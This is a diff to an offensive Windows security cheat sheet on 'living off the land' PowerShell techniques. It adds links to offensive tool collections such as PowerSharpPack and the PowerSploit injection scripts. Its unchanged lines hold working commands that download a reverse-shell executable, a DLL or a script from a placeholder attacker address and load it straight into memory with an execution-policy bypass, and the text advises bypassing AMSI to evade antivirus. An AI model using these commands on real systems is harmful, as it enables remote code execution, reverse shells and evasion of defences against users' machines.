@@ -138,7 +138,7 @@ Windows Security features and Microsoft security products
 II.  Examples of "living off the land" techniques using PowerShell (i.e. download and execute straight into memory PE, DLL and PoSh scripts) 
 ================================================================================================================================================
 
-PowerShell is built on .NET and we can interact with .NET in many ways with PowerShell. 
+PowerShell is built on .NET.
 
 There are several methods to load straight into memory .Net Assemblies (PE and DLL) such as : 
 > Add assembly with Add-Type cmdletPermalink
@@ -150,12 +150,27 @@ There are several methods to load straight into memory .Net Assemblies (PE and D
     $bytes = [System.Convert]::FromBase64String($dll)
     [System.Reflection.Assembly]::Load($bytes)
 
-Below are some examples of PowerShell commands that allow us to remotely download and inject straight into memory .Net Assemblies (PE and DLL) and PowerShell scripts.
+
+Examples of PowerShell scripts that can be used to load .NET assemblies (PE and DLL) and shellcodes straight into memory
+----------------------------------------------------------------------------------------------------------------------------
+
+=> PowerSharpPack is a tool with many useful offensive CSharp Projects wraped into one PowerShell script that can be remrely loaded into memory for easy usage.
+   + https://github.com/S3cur3Th1sSh1t/PowerSharpPack
+   
+=> The PowerShell script 'PowerLoader.ps1' builds script block which safely loads into-memory PowerShell script, .NET assemblies, and shellcodes.
+   + https://github.com/tmenochet/PowerExec/blob/master/PowerLoader.ps1
+   
+=> The PowerSploit frameworks - Old ( Invoke-ReflectivePEInjection.ps1, Invoke-DllInjection.ps1, Invoke-Shellcode.ps1)
+   + https://github.com/PowerShellMafia/PowerSploit/CodeExecution/
+   
+
+In addtion, below are some examples of PowerShell commands that allow us to manually download and inject straight into memory remote .Net Assemblies (PE and DLL)
+and PowerShell scripts.
 Keep in mind that to avoid AV detection it will necessary to bypass the AMSI (Refer to the next section).
 
-----------------------------------------------------------------------------------
-Examples - Download and execute a .Net PE straight into memory using PowerShell
-----------------------------------------------------------------------------------
+
+Examples - "Manually" Download and execute a .Net PE straight into memory using PowerShell
+-------------------------------------------------------------------------------------------------
 
 PS C:\temp> $data = (New-Object System.Net.WebClient).DownloadData('http://YOUR_IP_ADDRESS/CsharpRevShell.exe')
 PS C:\temp> $assem = [System.Reflection.Assembly]::Load($data)
@@ -169,9 +184,8 @@ PS C:\temp> $entryPointMethod = $assembly.GetType('ProcessInjection.Program', [R
 PS C:\temp> $entryPointMethod.Invoke($null, (, [string[]] ('', '')));
 
 
-----------------------------------------------------------------------------------
-Examples - Download and execute a .NET DLL straight into memory using PowerShell
-----------------------------------------------------------------------------------
+Examples - "Manually" Download and execute a .NET DLL straight into memory using PowerShell
+-------------------------------------------------------------------------------------------------
 
 PS C:\temp> $data = (New-Object System.Net.WebClient).DownloadData('http://YOUR_IP_ADDRESS/MyLibrary.dll')
 PS C:\temp> $assem = [System.Reflection.Assembly]::Load($data)
@@ -190,12 +204,12 @@ OR
   [System.Reflection.Assembly]::Load($bytes)
 
 
-------------------------------------------------------------------------
-Example - Download and execute a DLL straight into memory using PowerShell
-------------------------------------------------------------------------
+Example - "Manually"Download and execute a scripts straight into memory using PowerShell
+-------------------------------------------------------------------------------------------------
 
  PS C:\temp> powershell -exec bypass
  PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('https://YOUR_IP_ADDRESS/Your-PowerShell-Script.ps1'); Your-PowerShell-script-function-name
+
 
 
 ================================================================================================================================================
